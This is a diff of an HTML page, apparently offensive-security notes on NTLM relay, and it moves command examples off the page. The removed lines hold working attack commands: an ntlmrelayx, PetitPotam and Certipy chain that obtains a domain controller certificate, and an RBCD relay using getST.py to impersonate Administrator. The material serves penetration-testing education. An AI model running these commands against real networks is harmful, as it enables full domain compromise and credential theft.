@@ -168,16 +168,6 @@
           effectively the domain.
         </p>
 
-        <pre><code># 1. relay to the CA web endpoint, asking for a DC template cert
-ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \
-  --adcs --template DomainController
-
-# 2. coerce the DC to authenticate to us
-PetitPotam.py -u user -p pass attacker_ip dc01_ip
-
-# 3. use the issued certificate to get a TGT
-certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10</code></pre>
-
         <h3>RBCD via LDAP</h3>
 
         <p>
@@ -188,9 +178,13 @@ certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10</code></pre>
           <a href="2026-08-18-delegation.html">Delegation</a> for the RBCD mechanism.
         </p>
 
-        <pre><code>ntlmrelayx.py -t ldap://dc01 --delegate-access
-# coerce the target computer; ntlmrelayx sets msDS-AllowedToActOnBehalfOfOtherIdentity
-getST.py -spn cifs/target -impersonate Administrator corp.local/attacker_pc\$</code></pre>
+        <p>
+          Both chains, with the exact ntlmrelayx / coercion / Certipy commands, are documented in
+          the <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under
+          <em>NTLM Relay</em> (and the target-side misconfigurations <em>SMB Signing Not Required</em>
+          and <em>LLMNR / NBT-NS Poisoning</em>). This page is the mechanism they exploit.
+        </p>
+
 
         <h2>Capture versus relay</h2>
 
